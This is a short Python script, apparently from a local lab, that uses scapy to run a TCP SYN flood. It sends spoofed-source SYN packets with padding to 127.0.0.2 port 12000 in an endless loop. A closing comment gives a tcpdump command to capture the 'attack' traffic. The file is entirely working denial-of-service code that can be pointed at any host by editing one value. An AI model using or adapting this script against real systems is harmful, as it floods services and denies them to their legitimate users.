from scapy.all import *
def main():
    target_ip = "127.0.0.2"
    target_port = 12000
    ip = IP(src=RandIP(), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X"*1024)
    pak = ip / tcp / raw
    send(pak, loop=1, verbose=0)

if __name__ == "__main__":
    main()


# sudo tcpdump -i any host 127.0.0.2 -w attack.pcap